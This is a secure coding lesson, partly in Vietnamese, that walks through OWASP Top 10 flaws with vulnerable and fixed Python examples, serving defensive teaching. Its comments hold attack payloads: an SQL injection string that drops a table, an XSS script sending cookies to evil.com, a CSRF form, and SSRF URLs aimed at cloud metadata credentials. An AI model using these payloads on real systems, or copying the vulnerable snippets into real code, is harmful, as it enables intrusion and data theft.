# Bài 01: OWASP Top 10 & Secure Coding

## 🎯 Mục tiêu
- Hiểu OWASP Top 10 vulnerabilities
- Secure coding practices
- Input validation & output encoding

---

## 1. OWASP Top 10 (2021)

```
A01: Broken Access Control      — Users access unauthorized resources
A02: Cryptographic Failures     — Weak encryption, exposed secrets
A03: Injection                  — SQL, NoSQL, OS command injection
A04: Insecure Design            — Missing security in design phase
A05: Security Misconfiguration  — Default configs, verbose errors
A06: Vulnerable Components      — Outdated libraries with known CVEs
A07: Auth Failures              — Weak passwords, broken sessions
A08: Data Integrity Failures    — Insecure deserialization, unsigned updates
A09: Logging Failures           — Missing audit logs, no alerting
A10: SSRF                       — Server makes requests to attacker-controlled URLs
```

---

## 2. SQL Injection

```python
# ❌ VULNERABLE — string concatenation
def get_user(username):
    query = f"SELECT * FROM users WHERE name = '{username}'"
    # Input: ' OR '1'='1'; DROP TABLE users; --
    # → SELECT * FROM users WHERE name = '' OR '1'='1'; DROP TABLE users; --'
    return db.execute(query)

# ✅ SAFE — parameterized query
def get_user(username):
    query = "SELECT * FROM users WHERE name = %s"
    return db.execute(query, (username,))

# ✅ SAFE — ORM (SQLAlchemy)
def get_user(username):
    return session.query(User).filter(User.name == username).first()

# Rule: NEVER concatenate user input into queries
# Always use parameterized queries or ORM
```

---

## 3. Cross-Site Scripting (XSS)

```python
# ❌ Reflected XSS
# URL: /search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
@app.get("/search")
def search(q: str):
    return f"<h1>Results for: {q}</h1>"  # VULNERABLE

# ✅ SAFE — output encoding
from markupsafe import escape
@app.get("/search")
def search(q: str):
    return f"<h1>Results for: {escape(q)}</h1>"

# ✅ BEST — Content Security Policy header
# Prevents inline scripts from executing
# Content-Security-Policy: default-src 'self'; script-src 'self'

# XSS Types:
# Reflected  — Input reflected in response (URL params)
# Stored     — Input saved to DB, displayed to other users (comments)
# DOM-based  — Client-side JS manipulates DOM unsafely
```

---

## 4. Cross-Site Request Forgery (CSRF)

```python
# Attack: User logged into bank.com visits evil.com
# evil.com has: <form action="https://bank.com/transfer" method="POST">
#   <input name="to" value="attacker">
#   <input name="amount" value="10000">
# Browser automatically sends bank.com cookies!

# ✅ Protection: CSRF Token
from fastapi import Form, Depends
import secrets

def generate_csrf_token(session):
    token = secrets.token_urlsafe(32)
    session["csrf_token"] = token
    return token

@app.post("/transfer")
def transfer(csrf_token: str = Form(...), session=Depends(get_session)):
    if csrf_token != session.get("csrf_token"):
        raise HTTPException(403, "CSRF token invalid")
    # Process transfer...

# ✅ Also: SameSite cookies
# Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

---

## 5. Server-Side Request Forgery (SSRF)

```python
# ❌ VULNERABLE — user controls URL
@app.post("/fetch-url")
def fetch_url(url: str):
    response = requests.get(url)  # SSRF!
    # Attacker: url=http://169.254.169.254/latest/meta-data/
    # → Reads AWS metadata (credentials, tokens)
    # Attacker: url=http://internal-service:8080/admin
    # → Access internal services
    return response.text

# ✅ SAFE — URL validation
from urllib.parse import urlparse
import ipaddress

ALLOWED_SCHEMES = {"http", "https"}
BLOCKED_RANGES = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),  # AWS metadata
    ipaddress.ip_network("127.0.0.0/8"),
]

def validate_url(url: str) -> bool:
    parsed = urlparse(url)
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        for blocked in BLOCKED_RANGES:
            if ip in blocked:
                return False
    except ValueError:
        pass  # hostname, not IP — resolve and check
    return True
```

---

## 6. Broken Access Control

```python
# ❌ IDOR (Insecure Direct Object Reference)
@app.get("/api/orders/{order_id}")
def get_order(order_id: int):
    return db.get_order(order_id)  # Any user can see any order!

# ✅ SAFE — verify ownership
@app.get("/api/orders/{order_id}")
def get_order(order_id: int, current_user=Depends(get_current_user)):
    order = db.get_order(order_id)
    if order.user_id != current_user.id:
        raise HTTPException(403, "Forbidden")
    return order

# ✅ BETTER — query scoped to user
@app.get("/api/orders/{order_id}")
def get_order(order_id: int, current_user=Depends(get_current_user)):
    order = db.query(Order).filter(
        Order.id == order_id,
        Order.user_id == current_user.id  # Built into query
    ).first()
    if not order:
        raise HTTPException(404)
    return order
```

---

## 📝 Bài tập

1. Setup OWASP Juice Shop và tìm 5 vulnerabilities
2. Audit 1 project: tìm SQL injection, XSS, IDOR vulnerabilities
3. Implement CSRF protection cho web app
4. Setup Content-Security-Policy headers

---

## 📚 Tài liệu
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
- *The Web Application Hacker's Handbook*
